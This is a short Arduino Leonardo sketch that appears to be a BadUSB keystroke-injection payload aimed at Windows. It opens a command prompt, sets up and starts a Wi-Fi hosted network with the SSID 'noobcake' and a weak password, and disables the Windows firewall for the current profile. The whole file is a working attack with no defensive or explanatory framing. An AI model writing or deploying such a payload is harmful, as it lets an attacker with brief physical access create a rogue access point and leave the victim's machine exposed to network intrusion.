#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("cmd");
  delay(3000);
  Keyboard.println("netsh wlan set hostednetwork mode=allow ssid=noobcake key=12345678");
  delay(3000);
  Keyboard.println("netsh wlan start hostednetwork");
  delay(3000);
  Keyboard.println("netsh advfirewall set currentprofile state off");
  delay(3000);
  Keyboard.println("exit");
  delay(3000);
  while(1);
}
